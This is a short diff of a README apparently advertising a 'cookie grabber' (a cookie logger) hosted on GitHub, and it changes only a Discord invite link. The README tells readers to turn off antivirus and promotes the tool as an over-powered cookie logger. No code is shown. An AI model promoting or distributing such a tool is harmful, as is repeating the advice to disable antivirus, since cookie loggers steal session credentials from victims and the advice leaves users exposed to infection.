@@ -8,7 +8,7 @@ WARNING:Turn Off Anti 🦠Virus🦠
 
 
 Jays Cookie grabber, The most Over-powered cookie logger in github 🤯 
-https://discord.gg/5sRmUjQ2qg (UPDATED INV)
+https://discord.gg/GHGkJv4q (UPDATED INV)
 
 
 
